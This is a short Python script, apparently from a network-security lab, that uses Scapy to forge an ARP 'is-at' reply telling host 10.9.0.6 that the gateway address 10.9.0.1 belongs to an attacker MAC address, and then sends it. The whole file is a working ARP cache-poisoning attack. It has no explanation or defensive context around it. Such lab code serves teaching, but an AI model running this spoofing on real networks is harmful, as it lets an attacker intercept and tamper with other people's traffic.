from scapy.all import *

a = ARP()

a.op = 'is-at'
a.pdst = '10.9.0.6'
a.psrc = '10.9.0.1'
a.hwdst = '02:42:0a:09:00:06'
a.hwsrc = '02:42:0a:09:00:69'

a.show()

send(a)
